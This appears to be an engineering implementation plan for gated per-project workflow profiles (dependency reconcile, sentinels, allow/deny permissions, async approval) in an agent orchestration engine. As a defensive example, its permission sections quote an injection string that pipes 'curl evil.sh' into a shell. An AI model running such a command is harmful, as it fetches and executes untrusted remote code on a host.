# Implementation Plan — Per-Project Workflow Profiles (hooks + services + multi-stack + gated actions)

**Repo:** `python-orchestrator-v1` (the project-agnostic orchestration engine; runs multiple
instances, e.g. `--instance tendcharting`, `--instance cadencelms`).
**Author:** orch-manager (Opus) session, 2026-07-14. **Executor:** fresh agent (fable).
**Status:** design approved by operator; implement steps 2→5 below. Step 1 already shipped.
**Amended 2026-07-14** (fable review, operator-approved): exact-match permission semantics,
sentinel placement moved to gitdir, escalation×state-machine (`blocked_on_approval`) semantics,
pending-action persistence design (migration 0022), explicit workspace-manifest discovery,
role-scoped schema, probe-only services, v1 scope cut (no inline confirmation), security tests,
risk-6 rediagnosis, explicit per-instance cutover flag.

---

## 0. Why this exists (motivation)

The engine currently hardcodes **stack-specific** environment/hygiene logic into
**project-agnostic** core. Concretely, on 2026-07-14 the tendcharting fleet fully wedged
because a dependency (`multer`/`file-type`/`@aws-sdk/client-s3`) landed on `main` (senior
issue #390, merged 12:30 UTC) but the **QA verify worktrees kept a stale `node_modules`**,
so `verify_run`'s whole-repo typecheck failed with "Cannot find module" — a false negative
that bounced every issue toward `off_rails`. The immediate fix was `npm ci` in the stale
worktrees; the durable fix (step 1) added an automatic reconcile.

But that reconcile is **npm-specific code inside the shared engine**. The same binary also
runs cadencelms and could run a Python/Go project. `npm ci` living inside `verify_run` is one
project's stack leaking into shared core. This plan abstracts all such executable, stack-specific
hygiene into a **per-project Workflow Profile** so worker rules stay dynamic per project/architecture,
are human-viewable, reviewable, and gated for safety.

### Two kinds of "rules" — only the executable one is being abstracted here
- **Advisory rules (ADRs)** — text an LLM worker reads and honors. Already per-project, DB-stored,
  dashboard-editable, ADR-selectable. **Leave as-is.**
- **Executable environment/hygiene steps** — deterministic mechanical steps the *harness* runs to
  bring a worktree to a verifiable state (dep reconcile, codegen, migrations, service readiness,
  clean tree). Currently hardcoded. **This plan makes these a per-project profile.**

---

## 1. Current state — what is ALREADY shipped (step 1, do not redo)

Hardcoded npm reconcile that stopped the bleed. Files (in this repo unless noted):

- **NEW `orchestrator/apply/npm_deps.py`** — `ensure_deps_current(worktree) -> dict`. Hashes
  `package-lock.json`, compares to a self-managed sentinel `node_modules/.orch-lock-hash`, runs
  `npm ci --no-audit --no-fund` **only on change**; never falls back to `npm install` (that would
  mutate the lockfile and mask drift); a failed reinstall returns `ok=False` (real failure, not a
  false pass). Cheap one-hash no-op when unchanged. NOTE: npm's own `node_modules/.package-lock.json`
  is NOT byte-comparable to the root lockfile even right after a clean install, so it can't be the
  in-sync marker — hence the self-managed hash sentinel.
- **`orchestrator/mcp_server/tools_issues.py` → `verify_run`** — calls `ensure_deps_current(wt)`
  after checkout, before typecheck. Emits a `deps_reinstalled` event on reinstall; on install failure
  records a `tests_run` event and returns `passed=False` with a clear reason. Import added at top.
- **`orchestrator/apply/worktree.py` → `_apply_in_worktree`** (called by `apply_and_verify`) —
  same guard before running `verify_cmd`. Import added at top.
- **`orchestrator/agent_docs.py` → `_SYNC_STEP["dev"]`** — dev prompt now says: if `git merge main`
  changed `package-lock.json`, run `npm ci` before typecheck. (This activation needs a
  `render-agent-docs` + commit; there is a drift check on the generated CLAUDE.md/AGENTS.md.)
- **Governance:** ADR-BUILD-001 filed (status `proposed`) — "Verify and dev worktrees must reconcile
  node_modules to the lockfile before typecheck." Approve/trash on dashboard `/adrs`.

**In step 2 the npm logic MOVES behind the generic primitive but is not discarded** — `ensure_deps_current`
becomes the node adapter's `prepare` reconcile built-in.

---

## 2. Design decisions (LOCKED by operator — do not relitigate)

### 2.1 Two-file source of truth with an explicit precedence chain
- **Workspace Ops Manifest** — in the `*-ws` dir (the operator-owned orch control repo, already
  git-tracked; for tendcharting that is `/home/adam/github/tendcharting-ws`). Machine/instance-scoped.
  Tracks git wiring (remotes, main branch, per-team worktree paths, fetch/merge policy), CI/CD
  (promotion targets, human-test flow, deploy commands), stack/profile selection, **and the permission
  grant** (see 2.2). Operator control plane. Human-viewable. **Discovery is explicit:** each
  instance in `config/instances.yaml` gains a `workspace_manifest:` path key — the loader never
  derives the ws dir implicitly (e.g. from `promote_repo_path`'s parent). `orchestrator doctor`
  lints presence + validity of the key.
- **Repo Workflow Profile** — in the product repo (`.orchestrator/workflow.yaml`). Architecture-owned;
  travels with the code; reviewed in the same PR as the code that needs it. Declares workflow steps
  and each step's required actions.
- **Engine defaults** — `defaults/workflow.yaml` shipped in THIS repo, so both files are optional and
  zero-config works via auto-detect.

**Precedence (merge order):**
> engine defaults (baseline) → repo profile (the *request*: what the stack needs) → workspace manifest (the *authority*: allow/deny + overrides)

The repo *describes* what to run; the workspace *authorizes and can override*. **The workspace wins.**
This is why the permission grant must live in the workspace layer (2.2).

### 2.2 Required actions are gated like the agents that run them
- **Authority lives in the operator's workspace manifest, NEVER the repo profile.** If the repo file
  could grant its own bypass, anyone with commit rights gets arbitrary code execution on the host
  (the harness runs actions with the agent user's full OS access; "approved directory" scopes `cwd`
  but does not sandbox a malicious command). So: repo profile *requests* actions; workspace manifest
  holds the `allow`/`deny`/`bypass` grant that authorizes them. Bypass = "I trust this repo's
  committers" — a conscious operator grant, analogous to `--dangerously-skip-permissions`.
- **Confirmation is async-only in v1.** All gated action execution happens in engine/MCP-server
  contexts — workers are external opencode/codex processes driving MCP tools; the harness never
  runs actions inside their interactive sessions, so there is no inline-confirmation plumbing to
  build on. v1: an un-allowlisted action **pauses that step and escalates** (dashboard approval
  card + `comms_send` to orch-manager) — it must NOT block the event loop and must NOT silently
  run. An interactive inline-confirmation path is deferred to v2, if an in-session harness ever
  exists.
  - Model mirrors Claude Code `permissions.allow`/`ask`/`deny` + bypass, with "ask" made non-blocking.
  - **Escalation must never read as failure.** A pending approval surfaces from `verify_run` /
    `_apply_in_worktree` as a distinct `blocked_on_approval` outcome that the state machine treats
    as *not attempted* — never `passed=False` (that would recreate the false-negative → `off_rails`
    bounce this plan exists to kill, through the new machinery). Resume = the worker's next poll
    re-invokes the step after approval. Pending approvals **expire** (default 24h) → re-escalate +
    alert; a forgotten dashboard card must not wedge a lane forever.

### 2.3 Scope = the whole route: hooks + services + multi-stack.

---

## 3. Target architecture

### 3.1 Workflow = ordered steps; each step = gated required actions
| Step | Example required actions | Replaces today |
|---|---|---|
| `refresh` | dev: `git merge main`; qa: rebuild `_verify-<id>`; branch hygiene | sync/checkout logic |
| `services` | readiness probe of mongo, redis, s3-mock (probe-only — engine never starts them) | NEW |
| `prepare` | reconcile deps (`when_changed`), codegen (prisma, contracts build), migrations | today's npm ci |
| `verify` | typecheck + unit; e2e for the global gate | `settings.verify_cmd` |
| `cleanup` | `git reset --hard`, `git clean -fd` (NEVER `-x` — keeps node_modules + sentinel) | today's cleanup |
| `promote` | merge to main, deploy/CI-CD hook | CLI promote |

### 3.2 The generalized required-action primitive
```yaml
- run: <shell cmd>
  when_changed: [globs]     # optional — run only if any matched file changed since last run
  sentinel: <name>          # hash marker under the worktree's GITDIR (.git/orch/<name>) — never in-tree
  on_fail: block | warn | escalate
  timeout: <seconds>
```
One shape expresses npm/poetry/go/prisma/migrations uniformly. `when_changed`+`sentinel` is the
generalization of `ensure_deps_current`'s hash trick.

**Sentinel placement (hard rule):** sentinels live under the worktree's gitdir (`.git/orch/…`),
which `git clean` never touches and which is per-worktree correct. NEVER in the worktree proper:
the cleanup step's `git clean -fd` (no `-x`) deletes untracked-not-ignored files, so an in-tree
`.orchestrator/` sentinel would be wiped every cleanup and `when_changed` would silently re-fire
every cycle — a full reinstall per cycle, the exact cost the sentinel exists to avoid.
(`node_modules/.orch-lock-hash` survives today only because `node_modules` is gitignored; step 2
migrates it to the gitdir.)

**Permission matching (hard rule):** built-in named adapter actions are authorized by identity
(the engine ships them and trusts itself). Custom `run` strings are authorized only by an **exact
string match** (or sha256 pin) against the workspace-manifest allow list. Glob/prefix matching is
FORBIDDEN — `npm ci --no-audit && curl evil.sh | sh` matches the prefix `npm ci`, so a prefix
allowlist hands anyone with repo commit rights arbitrary host execution and defeats §5 entirely.
Precedence: deny > allow > default-escalate.

- **(amended during Phase C)** `authorize()` (`orchestrator/workflow/permissions.py`) also trusts
  an action by **provenance**: `action.source in ("default", "workspace")` authorizes like a
  builtin, with no allow-list entry needed (deny still beats it). This closes the cutover gap
  where every engine-shipped default `run:` action (the defaults-layer `cleanup` step's
  `git reset --hard && git clean -fd`, a stack adapter's custom `verify` command) would otherwise
  demand operator approval on day one, contradicting this section's own posture of allowlisting
  the built-in adapter commands the engine ships. It is spoof-proof because `source` is stamped
  **unconditionally** per layer by `merge._parse_action_list` — every action dict is copied and its
  `source` key is overwritten with the caller's hardcoded layer label (`loader.py` calls
  `parse_profile_dict(repo_raw, "repo")` / `(workspace_raw, "workspace")` /
  `(combined_defaults_raw, "default")`), never with a value read from the YAML itself. So a repo
  profile that textually declares `source: default` (or `source: workspace`) to forge engine or
  operator provenance gets it discarded and re-stamped `"repo"` before `authorize()` ever sees it —
  repo-sourced actions are the only ones still requiring an explicit allow-list grant or builtin
  identity. The engine trusts what it ships; the workspace manifest IS the operator's authority and
  is self-authorizing by definition.

**Role scoping:** a step's value is either a plain action list (applies to all roles) or a mapping
of role → action list (`dev:` / `qa:` / `senior:`), because dev and qa genuinely diverge at
`refresh` (merge main vs. rebuild the verify branch) and `verify_worktrees` is already per-team.

### 3.3 Multi-stack via adapters
`stack: node | python | go | rust` selects a built-in bundle of default required-actions per step;
the profile overrides per step. **Auto-detect** from lockfile presence: `package-lock.json`→node,
`poetry.lock`/`uv.lock`→python, `go.sum`→go, `Cargo.lock`→rust. `ensure_deps_current` becomes the
node adapter's `prepare` reconcile.

### 3.4 Example resolved profile (tendcharting, node)
```yaml
stack: node
services: [mongo, redis]              # probed (never started) before verify
refresh:                              # role-scoped: dev and qa genuinely differ here
  dev:
    - run: git merge --no-edit main
  qa:
    - builtin: rebuild-verify-branch  # force-reset _verify-<id> from the issue branch
prepare:
  - run: npm ci --no-audit --no-fund
    when_changed: [package-lock.json]
    sentinel: orch-lock-hash          # stored at <gitdir>/orch/orch-lock-hash
    on_fail: escalate
  - run: npm run build:contracts       # codegen; always
verify:
  - run: npm run typecheck && npm test
    on_fail: block
cleanup:
  - run: git reset --hard && git clean -fd   # never -x
```

---

## 4. Implementation steps (do these; step 1 is done)

### Step 2 — extract the generic primitive; move npm behind it (PURE REFACTOR, no behavior change)
- New package `orchestrator/workflow/`:
  - `models.py` — dataclasses: `RequiredAction`, `WorkflowStep`, `Profile`.
  - `loader.py` — `load_effective(instance, worktree) -> Profile`: merges engine defaults →
    `<repo>/.orchestrator/workflow.yaml` → the workspace manifest at the instance's
    `workspace_manifest:` path (new instances.yaml key) per 2.1 precedence; auto-detects `stack`
    when unset. **Merge semantics:** a layer that defines a step REPLACES that step's action list
    wholesale — no deep list-merging. Models carry the optional role dimension (§3.2).
    **Fail-safe:** a malformed/unreadable profile file falls back to engine defaults + raises an
    alert; a config parse error must never wedge verify.
  - `adapters/node.py` (+ stubs for python/go) — default per-step actions; node's `prepare` calls
    `ensure_deps_current` (relocate the call, keep `npm_deps.py`).
  - `runner.py` — `run_step(wt, profile, step_name, ctx) -> StepResult`, and the `when_changed`+sentinel
    evaluator (generalize `npm_deps` hashing to arbitrary globs).
- Ship `defaults/workflow.yaml` reproducing **exactly** current behavior for a node repo with no
  profile — including absorbing `verify_run`'s hardcoded fallback (`npm run typecheck && npm test`,
  tools_issues.py ~570) so the engine has exactly one baseline definition.
- Rewire call sites to `run_step(...)`: `verify_run` (`prepare`+`verify`), `_apply_in_worktree`
  (`prepare`+`verify`), and keep the dev prompt but plan to generate it (step 4).
- **Per-instance cutover flag:** `workflow_profile: enabled | legacy` in the instance's settings
  block; the legacy code path is retained until step 5 acceptance. tendcharting cuts over first;
  cadencelms stays `legacy` until proven.
- Migrate the npm sentinel from `node_modules/.orch-lock-hash` to `<gitdir>/orch/` (§3.2 hard rule).
- **Acceptance:** tendcharting behaves byte-identically (verify still typechecks green; reconcile still
  fires only on lockfile change). Add unit tests for merge/precedence + auto-detect.

### Step 3 — the gating executor + visibility
- Workspace-manifest `permissions: {allow: [...], deny: [...], bypass: bool}`. **Matching per the
  §3.2 hard rule:** built-ins authorized by identity; custom `run` strings by exact match / sha256
  pin — never glob/prefix. Precedence: deny > allow > default-escalate. Enforce in `runner.py`
  before executing any action.
- Async confirmation (v1 is async-only — no inline path, see 2.2): `escalate` → dashboard approval
  card + `comms_send` to orch-manager; the step returns **`blocked_on_approval`** WITHOUT blocking
  the engine loop, and the state machine treats it as *not attempted* — never a failed verify.
  Resume: the worker's next poll re-runs the step. Approvals expire (default 24h) → re-escalate +
  alert.
- **Persistence (hard invariant #1 — all writes via `repository.py`):** new migration
  `migrations/0022_pending_actions.sql` — `pending_actions` table (issue_id, worktree, step,
  resolved action, requested_by, status `pending|approved|denied|expired`, timestamps) + repository
  CRUD. An `issue_events` entry for EVERY gated-action outcome (executed / refused / escalated /
  approved / denied / expired) — the generic runner keeps the audit trail step 1 established
  (`deps_reinstalled`, `tests_run`).
- **Dashboard approval card (scoped):** an `/actions` review queue mirroring `/adrs` — pending
  action, requesting issue, exact resolved command, approve/deny buttons writing through repository.
- New CLI `orchestrator workflow explain --instance X [--team T]` — prints the resolved effective
  workflow (what will actually run) for operator review, **with per-action provenance** (which
  layer — engine default / repo profile / workspace manifest — contributed or overrode it).
- Extend `orchestrator doctor` to lint the effective workflow (unknown step, un-authorized action,
  missing adapter, missing/invalid `workspace_manifest:` key).
- **Acceptance:** an un-allowlisted action is refused+escalated on the daemon path (never silently
  run, never deadlocks); the issue shows `blocked_on_approval`, NOT a failed verify; approval
  resumes the step on the next worker poll; an expired approval re-escalates; `workflow explain`
  matches actual behavior.

### Step 4 — services + prepare/cleanup hooks + generated dev prompt
- `services` readiness probes (mongo/redis/s3-mock): each adapter defines a probe; `on_fail: escalate`.
  **Probe-only in v1** — the engine never starts/stops services (no engine-owned lifecycle, no
  leaked containers, no ownership ambiguity on crash); starting them is operator-side, and the
  workspace manifest documents the systemd/podman recipe.
- Wire `prepare`/`cleanup` fully; ensure `cleanup` never uses `-x`.
- Generate the dev-prompt reconcile line in `agent_docs.py` FROM the profile so instruction and enforced
  step cannot drift. (Requires `render-agent-docs` + commit; respect the generated-file drift check.)
- **Acceptance:** verify fails fast with a clear message if a required service is down; dev docs
  regenerate cleanly and pass the drift check.

### Step 5 — second stack adapter + validation
- Implement `python` (or `go`) adapter end-to-end; validate against cadencelms if its stack differs,
  else a fixture repo.
- **Acceptance:** a non-node project runs verify through the same `run_step` path with zero engine changes.

---

## 5. Security boundary (the crux — get this right)
- Bypass/allowlist authority = **workspace manifest only**. Repo profile can request but never
  self-authorize.
- Actions run as the agent OS user, `cwd`=worktree. Document that bypass ≡ trusting repo committers.
- Default posture with no grant: allowlist the built-in adapter commands (npm/git/etc.) shipped by the
  engine; anything else escalates. Prefer built-in named steps; treat custom shell as the escape hatch.
- Allowlist matching is exact-match / built-in-identity ONLY (§3.2 hard rule) — glob/prefix matching
  over a shell string is trivially bypassable (`npm ci && …` matches prefix `npm ci`) and forbidden.
- Repo-profile files can only *request*: any `permissions:`/grant keys found in the repo profile are
  ignored and flagged by `doctor` (tested in §7).

## 6. Backward compatibility & rollout
- Ship defaults that reproduce today's behavior; roll out **one instance at a time** via the
  per-instance `workflow_profile: enabled | legacy` flag (step 2) so cadencelms is not disturbed by
  tendcharting's migration; the legacy path is deleted only after step 5 acceptance.
- Never cut over a call site until its replacement is proven behavior-identical (step 2 gate).

## 7. Testing
- Unit: precedence merge (incl. per-step REPLACE semantics + role scoping), auto-detect,
  `when_changed`/sentinel evaluator (incl. sentinel survives `git clean -fd`), permission gating
  (allow/deny/bypass/escalate, deny-wins), non-blocking escalation, `blocked_on_approval` treated
  as not-attempted by the state machine, approval expiry.
- Security: a malicious repo profile attempting self-authorization (grant keys in the repo file are
  ignored + flagged); suffix/metachar injection against the allow list (exact-match holds:
  `npm ci && curl …` does NOT match an `npm ci --no-audit --no-fund` grant); deny overrides both
  allow and bypass.
- Hermetic (hard invariant #5): runner tests use fake commands in fixture repos — no npm, no
  network, no API keys.
- Integration: a node fixture (reconcile fires only on lockfile change), a second-stack fixture.
- Regression: tendcharting verify path stays green.

## 8. Concerns / risks
1. **Blast radius:** shared engine core → both instances. Only cut over call sites behind the
   behavior-identical gate.
2. **Security:** arbitrary shell + bypass = host RCE unless authority stays operator-side. Highest-care item.
3. **Async confirmation is net-new plumbing** — don't ship gating without it or the daemon silently runs
   everything / deadlocks.
4. **Config-drift surface** (3 sources) — mitigate with `workflow explain` + `doctor` lint.
5. **Determinism** — keep built-in adapters trusted-default; custom shell is the escape hatch.
6. **Known engine bug to fix in passing — REDIAGNOSED 2026-07-14:** the MAX-suffix key allocation
   was already fixed 2026-06-13 (`3dc3bdb`); do NOT re-fix it. The live bug is a case-sensitivity
   mismatch in `repository.create_adr` (~line 959): the counter query is `WHERE domain = %s`
   (case-sensitive) but the key is built from `domain.upper()`, so domains `dev`/`DEV` share a key
   namespace without sharing a counter → duplicate `ADR-DEV-001` → unique-constraint error.
   Fix: normalize domain on write and make the counter query case-insensitive.

## 9. Definition of done
Every executable hygiene step tendcharting needs is expressed in a human-viewable, reviewable profile;
the engine contains no stack-specific hardcode; actions are gated by an operator-controlled authority
with async escalation; a second stack runs through the same path unchanged; ADR-BUILD-001 (or a superseding
ADR describing the profile system) is accepted.

## 10. Key file pointers
- `orchestrator/apply/npm_deps.py` (step-1 helper → node adapter reconcile)
- `orchestrator/mcp_server/tools_issues.py::verify_run` (~line 518; reconcile inserted after checkout)
- `orchestrator/apply/worktree.py::_apply_in_worktree` / `apply_and_verify` (~line 53–110)
- `orchestrator/agent_docs.py::_SYNC_STEP["dev"]`
- `orchestrator/config.py` (`verify_cmd`, `verify_worktrees`; add workflow-profile loading)
- `config/instances.yaml` (add per-instance `workspace_manifest:` path + `workflow_profile:` flag)
- `migrations/0022_pending_actions.sql` (NEW — pending-approval persistence; latest today is 0021)
- `orchestrator/repository.py::create_adr` (~line 959 — domain case-normalization fix, risk 6)
- Workspace manifest target dir: `/home/adam/github/tendcharting-ws/`
- Memory (operator context): `verify-worktree-stale-node-modules`
